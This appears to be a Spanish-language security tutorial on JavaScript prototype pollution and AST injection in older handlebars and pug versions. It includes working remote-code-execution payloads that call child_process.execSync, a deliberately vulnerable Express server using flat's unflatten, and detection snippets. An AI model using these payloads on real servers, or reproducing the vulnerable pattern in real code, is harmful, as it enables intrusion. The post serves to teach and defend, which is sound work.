+++
draft = false
date = 2021-12-08T12:37:40+01:00
title = "Prototype Pollution"
description = ""
slug = ""
authors = ["LeVarez"]
tags = []
categories = []
externalLink = ""
series = []
+++

# Prototype Pollution

Primero de todo, qué és la contaminación prototype? Como puede comprometer la seguridad de nuestro sistema?

Este tipo de ataque se lleva a cavo en el lenguage de programación JavaScript, ya que este mismo és prototype-based. Todos los nuevos objetos que se crean llevan las propiedades y mètodos del objeto prototype, el cual contiene funcionalidades bàsicas como ```toString()```, ```constructor()``` y ```hasOwnProperty()```.

Los atacantes puedes hacer uso de esta característica del lenguaje para poder hacer canvios a todos los objetos de la aplicación haciendo una modificación al objeto prtototype. De aquí el nombre de prtotype pollution.

Este objeto puede ser accedido desde cualquier otro objeto a través del atributo ```__proto__```. Y una vez este objeto es modificado todos los objetos de l'aplicación en marcha seràn modificados, tanto los que se creen de nuevo como los que ya estavan creados antes de la modificación[[ 1 ]](https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications).

A continuación vamos a ver un pequeño ejemplo de como és el comportamiento.

```js
let chocolate  = {
    marca: "Chocolates LeVarez"
    precio: 2
};
```

Si mostramos la salida de este objeto a través del mètodo ```toString()``` que viene predefinido en el objeto prototype podremos observar la siguiente salida:

```js
chocolate.toString();
//Output: '[object Object]'
```
Ahora a traves de otro objeto nuevo podemos modificar el comportamiento de la funcion ```toString()```. Accederemos a el a través de la propiedad ```__proto__```:

```js
let chocolateConLeche  = {
    marca: "Chocolates LeVarez",
    precio: 3
};

chocolateConLeche.__proto__.toString = () => true;

chocolate.toString();
//Output: True
```

Ahora se ha cambiado completamente el comportamiento de la función toString en todos los objetos del programa, de tener un valor de retorno una cadena de caràcteres (String) ahora tiene un valor Boolean. Si en nuestra aplicación se canvian los estos valores podria provocar un crasheo de la apliacion.

Veamos que operaciones pueden influir en este tipo de ataques y que pasaria si un atacante pudiera modificar la propiedad property de un objeto. Según ``Olivier Arteau`` hay algunas operaciones conflictivas que permetirian la inserción de propiedades en este objeto. La operacion ```merge(a,b)``` puede ser peligrosa.

```js
let chocolate  = {
    promocion: "50%"
    precio: 2,
};

let chocolateConMiel  = {
    precio: 4,
    extras: "miel"
};

let chocolateFusionado = merge(chocolat, chocolateConMiel);
/*Output
chocolateFusionado = {
    promocion: "50%"
    precio: 4,
    extras: "miel"
}
*/
```
Podemos observar que cuando 2 objetos comparten un mismo atributo el segundo tiene predominancia y sobrescribe el valor del primero. veamos la operacion merge:

```js
let merge = (a, b) => {
    for (let attr in b) {
        if(isObject(a[attr]) && isObject(b[attr])){
            merge(a[attr], b[attr]);
        } else {
            a[attr] = b[attr];
        }
    }
    return a;
}
```

La función recorre todos los atributos del objeto ```b```, por cada atributo comprueba si el actual es un objecto y existe en los dos, si és asi hace una llamada recursiva de la misma función, si no, substituye o añade al objeto ```a``` el atributo actual. Finalmente devuelve el objeto ```a```. Entonces si tenemos un objeto ```b``` cuyo valor és ```{"__proto__":{"contaminado":"estoy contaminado"}}```. Si éste se aplica a la función merge puede contaminar todos los objetos que ya existen y a todos los futuros objetos que se creen.

```js
let chocolate = {
    precio:  2,
}

let contaminado = {
    __proto__: {
        contaminado: "estoy contaminado"
    }
}

merge(chocolate, contaminado);

let chocolateDelVacio = {};

chocolateDelVacio.contaminado;
//Output: 'estoy contaminado'
```
Otra operación muy frecuente que puede provocar el mismo efecto és la operación ```clone(a)```. Si éste objecto se clona a través de la función ```merge({},a) también serà suceptible al prototype pollution.

```js
let clone = (a) => {
    return merge({}, a);
}

let contaminado = {
    __proto__: {
        contaminado: "estoy contaminado"
    }
}

let chocolateClonado = clone(contaminado);
chocolateClonado.contaminado;
//Output: 'estoy contaminado'
```
Otra operación seria la de la assignación por ruta o path assignment. Donde algunas librerias nos permiten assignar un valora a una propiedad de un objecto a través de una ruta tal i como se puede ver a continuación, donde el primer paràmetro és el objeto, el segundo la ruta a la propiedad i el tercero el valor:

```js
let chocolate  = {
    precio: {
        precio: 1.5,
        iva: 47
    }
};

setValue(chocolate, "precio.iva", 0);

chocolate.precio.iva
//Output: 0
```
Si los atacantes són capaces de controlar el paràmetro de ruta podrian introducir como ruta ```__proto__.contaminado``` y contaminar todos los objetos.

```js
let chocolate  = {
    precio: {
        precio: 1.5,
        iva: 47
    }
};

setValue(chocolate, "__proto__.contaminado", "estoy contaminado");

let chocolateDelVacio = {};
chocolateDelVacio.contaminado
//Output: 'estoy contaminado'
```

Por lo que nunca debemos dar al usuario control absoluto de la entrada de la ruta. Visto todo esto cuáles són los possibles ataques que se podrian realizar a través de prototype pollution?

Si pensamos, en muchos programas puede ser que haya una crida de todas propiedades de un objeto, que pasaría si una de estas propiedades fuera recursíva a si misma? Asi és! Stack Overflow!

Como puede efectuar-se esto? bien, como hemos dicho todos los objetos se crean a partir del objeto prototype, por lo que si tiene una propiedad que si contaminamos con una propiedad que solo contenga un objeto vació éste se va a contener a sí mismo recursivamente.

```js
Object.prototype.nada = {}
({}).nada.nada.nada.nada === ({}).nada;
```
Podemos observar que se puede ir llamando el objeto a si mismo sin limite. Entonces para poder añadir un objeto vacio sin que se llame recursivamente a si mismo lo que deberiamos hacer es crear un objeto con una propiedad que se llame igual que su propiedad i hacer a que apunta a "nada". De tal forma que cuando se cree un objeto este no se podria llamar recursivamente[[ 2 ]](https://www.youtube.com/watch?v=LUsiFV3dsK8&ab_channel=NorthSec).

```js
Object.prototype.nada = {nada: ""}
({}).nada.nada === "";
```

# AST

Teniendo todo lo anterior en cuenta ahora vamos a ver los AST (Abstract node tree). Los AST són la representació de árbol de la estructura sintáctica simplificada del código fuente escrito en cierto lenguaje de programación. Los AST són utilizados muy a menudo en JavaScript como plantillas de motores, typescript...

A continuación podemos ver como es el AST de nodeJS usando ```handlebars```:

![NodeJS AST](/nodejsast.png#center)

En la foto anterior podemos observar que nuestra plantilla de handlebars sigue una sèrie de passos hasta ser compilado. Tenemos nuestra plantilla que la passamos por un lexer. El lexer és una herramienta que se encarga de convertir el texto a una lista de tokens para processar posteriormente. Normalemente se usa para crear lenguajes de programación pero a veces tambien para el processamiento de texto entre otras cosas [[ 3 ]](https://dev.to/areknawo/lexing-in-js-style--b5e).

Una vez tenemos los tokens el siguiente passo es el parser o analizador sintáctico. El parser és un programa que analiza una cadena de tokens según las reglas de la gramàtica del lenguaje. El parser convierte los tokens de entrada en otras estructuras (comunmente árboles). que són más útiles para el psoterior anàlisis ya que capturan la jerarquía de la entrada, estos són nombrados árboles de sintaxis abstracta.

Veamos con un ejemplo fàcil como esto funciona. Imaginemos la entrada ```12*(3+4)^2``` de una calculadora. El lexer generaria los siguientes tokens ```12, *, (, 3, +, 4, ), ^ y 2``` (análisis léxico), el parser contendrà las reglas necesarias para indicar que los simbolos ```*, (, +, ) y ^``` indican el comienzo de un nuevo token. Lo siguiente és un análisis sintáctico para comprobar que el conjunto de tokens forman una expressión vàlida y por último queda el análisis sintàctico que evalua la expressión [[ 4 ]](https://www.techopedia.com/definition/3854/parser)[[ 5 ]](https://es.wikipedia.org/wiki/Analizador_sint%C3%A1ctico). Los siguientes pasos seria la compilación del AST a lenguaje máquina i la ejecución del código.

Entonces a través de la propiedad prototype se podria insertar codigo durante las operaciones del Parser o del Compilador. En la imagen que se muestra a és un esquema del concepto de inserción de codigo a través de la contaminación del objecto prototype.

![NodeJS AST Polluted](/nodejsastpolluted.png#center)

Podemos observar que a través de la contaminación prototype hemos contaminado el Parser y en consecuencia el AST ha sido alterado por lo que cuando el compilador procese el código se va a generar el codigo contaminado y por ende puede llegar a ejecutar comandas remotas. Hay algunas versiones conocidas de ```handlebars``` y ```pug``` que són vulnerables a este tipo de ataque. A continuación vamos a analizar porqué estas són vulnerables.

Es interesante, en caso de que nuestro programa use handlebears o pug, poder detectar si estamos usando una versión vulnerable. Este fallo solo se encuentra en versiones anteriores, en las versiones más nuevas no se puede ejecutar comandos, incluso si alguna templete puede ser inserida de alguna forma.

# Handlebars

Para comprovar si nuestro programas es o no vulnerable a este tipo de ataques podemos ejectuar el siguiente codigo:

```js
const Handlebars = require('handlebars');

/****************************************************************/
Object.prototype.pendingContent = `<script>alert("Polluted")</script>`
/****************************************************************/

const source = `Hello {{ msg }}`;
const template = Handlebars.compile(source);

console.log(template({"msg": "posix"})); // Hello posix
```

Podemos inserir cualquier cadena de caracteres en ```Object.prototype.pendingContent``` para determinar si un ataque es possible.

```js
/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js

...
appendContent: function appendContent(content) {
	if (this.pendingContent) {
		content = this.pendingContent + content;
	} else {
		this.pendingLocation = this.source.currentLocation;
	}

	this.pendingContent = content;
},
pushSource: function pushSource(source) {
	if (this.pendingContent) {
		this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
		this.pendingContent = undefined;
	}

	if (source) {
		this.source.push(source);
	}
}
...
```

Si observamos ```appendContent``` que està en el fitxero ```javascript-compiler``` podemos observar que lo que hace es comprovar si hay contenido pendiente, si és así ajunta el contenido pendiente con el contenido actual y guarda todo el el contenido a pending content. Posteriormente ```pushSource``` añade el contenido al buffer i pone pendingContent en ``undefined`` para prevenir multiples insersiones.

Si recordamos el gràfico anterior donde se explicaba como funcionva el AST de nodeJS, teniamos el lexer i el parser que generaban el AST donde este posteriormente era enviado al compilador para ser ejecutado.


```js
/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js

case 36:
    this.$ = {
        type: 'NumberLiteral',
        value: Number($$[$0]),
        original: Number($$[$0]),
        loc: yy.locInfo(this._$)
    };
    break;
```

En handlebars el parser fuerza que todo valor del tipo NumberLiteral sea un number. Para convertir de NumberLiteral a number lo hace a través constructor tal i como se puede observar en el codigo anterior. El caso es que nosotros podemos inserir cualquier tipo de string utilizando la prototype pollution.

```js
/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js

function parseWithoutProcessing(input, options) {
  // Just return if an already-compiled AST was passed in.
  if (input.type === 'Program') {
    return input;
  }

  _parser2['default'].yy = yy;

  // Altering the shared object here, but this is ok as parser is a sync operation
  yy.locInfo = function (locInfo) {
    return new yy.SourceLocation(options && options.srcName, locInfo);
  };

  var ast = _parser2['default'].parse(input);

  return ast;
}

function parse(input, options) {
  var ast = parseWithoutProcessing(input, options);
  var strip = new _whitespaceControl2['default'](options);

  return strip.accept(ast);
}
```

Podemos observar como la función ``parseWithoutProcessing`` Acepta dos tipos de para ``input``, los quales pueden ser de tipo ``Program`` y ``template string``. cuando ``input.type`` es ``Program`` este directamente se envia al compilador sin hacer ninguna comprobación de mas, aunque este sea de otro tipo como podria ser un string.

El codigo que veremos a continuación corresponde al compilador de handlebars:

```js
/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js
...
accept: function accept(node) {
    /* istanbul ignore next: Sanity code */
    if (!this[node.type]) {
        throw new _exception2['default']('Unknown type: ' + node.type, node);
    }

    this.sourceNode.unshift(node);
    var ret = this[node.type](node);
    this.sourceNode.shift();
    return ret;
},
Program: function Program(program) {
    console.log((new Error).stack)
    this.options.blockParams.unshift(program.blockParams);

    var body = program.body,
        bodyLength = body.length;
    for (var i = 0; i < bodyLength; i++) {
        this.accept(body[i]);
    }

    this.options.blockParams.shift();

    this.isSimple = bodyLength === 1;
    this.blockParams = program.blockParams ? program.blockParams.length : 0;

    return this;
}
...
```
Cuando el compilador recive un Objeto AST este es enviado a la funcion ``accept`` donde comprueba el tipo si es un tipo esperado, en caso de que no lo sea lanza una excepcion pero en caso que sea un tipo esperado el programa avanza. Posteriormente en la funcion Program recoge el atributo body del AST i lo utiliza para crear una function. Por lo que nosotros podremos inyectar cualquier codigo si vamos a traves del parser. Para hacerlo tendremos que assignar un string que no puede ser assignado como valor al tipo NumberLiteral. Pero como el AST inyectado procede, el codigo se ejecutarà. Por lo que podriamos hacer algo como:

```json
{
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.
                        require('child_process').
                            execSync(`fsutil file createnew prova1.txt 2000`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
}
```

Podemos observar que esta peticion lo que pretende es contaminar los objectos con los campos type y body con los campos especificos para que al ejectutar la funcion compile de modulo de handlevasr nos permita ejecutar codigo remoto. Para que esto sea efectivo voy a mostrar una pequeña muestra de como tendria que funcionar el servidor para que esto ocurriese.

```js
const express = require('express');
const unflatten = require('flat').unflatten;
const bodyParser = require('body-parser');
const Handlebars  = require('handlebars');

const app = express();
app.use(bodyParser.json())

app.get('/', function (req, res) {
    var source = "<h1>La pagina esta funcionant!</h1>";

    var template = Handlebars.compile(source);
    res.end(template({}));
});

app.post('/vulnerable', function (req, res) {

    let object = unflatten(req.body);
    res.json(object);

});

app.listen(3000);
```

El servidor web usa ``express`` ademas de otros modulos donde hace falta destacar ``flat``. En versiones anteriores de flat hay una vulnerabilidad que permita la contaminación del objeto prototype. La falla se encuentra en la función unflatten donde en este caso processa los campos recividos por la petición post sin prèvia validación. En caso de que ser reciva los campos expuestos anteriormente va a provocar que todo el programa se contamine. Para ver mas información sobre las versiones vulnerables pudes pulsar [aqui](https://security.snyk.io/vuln/SNYK-JS-FLAT-596927)).Por ende si posteriormente se hace una petición get para mostrar la pàgina, handlebars va a ejecutar la función ``compile(source)`` lo que va a causar que se ejecute codigo remoto. En este caso creará un documento en la carpeta del servidor. Puedes ver las versiones afectadas de handlebars [aqui](https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-1279029) [[ 6 ]](https://security.snyk.io/vuln/SNYK-JS-FLAT-596927)[[ 7 ]](https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-1279029).

Con la ejecución de codigo remoto que se consigue se puede ver claramente el nivel de peligrosidad que se puede crear. Dando la possiblidad de ejecutar cualquier tipo de comando en el servidor. Como se ha dicho previamente la mejor solución para este fallo de seguridad es actualizar ambos modulos a una version actual[[ 8 ]](https://blog.p6.is/AST-Injection/#Exploit).

# Pug

Pug es un modulo de nodejs el qual a través de la función ```pug.compile()``` permite compilar el codigo fuente de Pug a una función Javascript que coje un objeto de datos nombrado ``locals`` como argumento. En resumen es un motor de plantilla con el que eres capaz de escrivir codigo html con una sintaxis mas senzilla. Puedes encontrar más información al respecto [aquí](https://pugjs.org/api/getting-started.html).

Versiones anteriores a este modulo tambien disponen de errores importantes que nos permiten la ejecución de codigo remoto. Para poder comprobar si tu sitio web es vulnerable a este se puede hacer uso del siguiente codigo:

```js
const pug = require('pug');

Object.prototype.block = {"type":"Text","val":`<script>alert(origin)</script>`};

const source = `h1= msg`;

var fn = pug.compile(source, {});
var html = fn({msg: 'It works'});

console.log(html);
```

En caso que nuestra versión sea vulnerable si contaminamos el objeto prototype con nuevo objeto nombrado ``block`` el codigo que contenga (AST) el compilador lo añade al buffer haciendo referencia a val. Podemos observar las siguientes lineas de código.

```js
switch (ast.type) {
    case 'NamedBlock':
    case 'Block':
        ast.nodes = walkAndMergeNodes(ast.nodes);
        break;
    case 'Case':
    case 'Filter':
    case 'Mixin':
    case 'Tag':
    case 'InterpolatedTag':
    case 'When':
    case 'Code':
    case 'While':
        if (ast.block) {
        ast.block = walkAST(ast.block, before, after, options);
        }
        break;
    ...
```

Cuando ``ast.type`` és cualquiel valor desde ``case`` hasta ``While``, llama a la función walkAST la qual passa como parametro ``ast.block`` el qual hace referencia al objeto prototype si este no esta definido. El detalle està en que si la plantilla hace referencia a cualquier valor de los argumenteos, el nodo While siempre va a existir. Es decir que siempre estaran definidos en la plantilla, ya que si no necessita hacer referencia de ninguno de estos valores no necessitaria i/o deberia usar este modulo o cualquier otro de templates engines.

```js
/node_modules/pug-code-gen/index.js

if (debug && node.debug !== false && node.type !== 'Block') {
    if (node.line) {
        var js = ';pug_debug_line = ' + node.line;
        if (node.filename)
            js += ';pug_debug_filename = ' + stringify(node.filename);
        this.buf.push(js + ';');
    }
}
```
En este fragmento de codigo podemos observar que la variable ```pug_debug_line``` guarda el valor del la linea del nodo i posteriormente se añade en el buffer. Anteriormente se hace la comprovación de que este valor exista para ser añadido, pero lo interesante és que todos los AST que se generan a partir del parser de pug ya tienen la linea especificada. Por lo que podemos preguntar: ¿Que passaria si en vez de poner un numero introducimos una cadena? ¡Exacto! esta cadena se guarda en el buffer.

Por lo que si tenemos en cuenta los que hemos dicho anteriormente de que si tenemos la referencia de alguno de los argumentos en la template si o si se va a generar el nodo While, por lo que se va a ejecutar la línea walkAST y que esta va a usar el valor del objeto prototype si no esta definido y que posteriormente también se va a ejecutar la linea de codigo anterior donde se añadia el valor de ``line`` en el buffer. Entonces si contaminamos el programa con un objeto prototype con valores ``block`` y ``line`` concretos podemos llegar a ejecutar codigo remoto. Vamos a ver:

```js
{
    "__proto__.block": {
        "type": "Text",
        "line": "console.log('Buenos dias, quiero macarrones.');"
    }
}
```

Si conseguimos de alguna forma contaminar el programa con estos datos y tenemos en cuenta lo que hemos dicho anteriormente, conseguiremos escribir en la consola del servidor donde este alojado el programa la frase: "Buenos dias, quiero macarrones". Para poder hacer un ejemplo podemos utilizar el codigo anterior y hacer uso del modulo ``flat`` el cual tiene una vulnerabilidad que permite hacer contaminación prototype.

```js
const express = require('express');
const unflatten = require('flat').unflatten;
const bodyParser = require('body-parser');
const pug  = require('pug');

const app = express();
app.use(bodyParser.json())

app.get('/', function (req, res) {
    var source = "La pagina esta funcionant!";
    const template = pug.compile(`h1= msg`);
    res.end(template({msg: source}));
});

app.post('/vulnerable', function (req, res) {

    let object = unflatten(req.body);
    res.json(object);

});

app.listen(3000);
```


# Referencias

[ 1 ]

[ 2 ]

[ 3 ]

[ 4 ]

[ 5 ]

[ 6 ]

[ 7 ]

[ 8 ]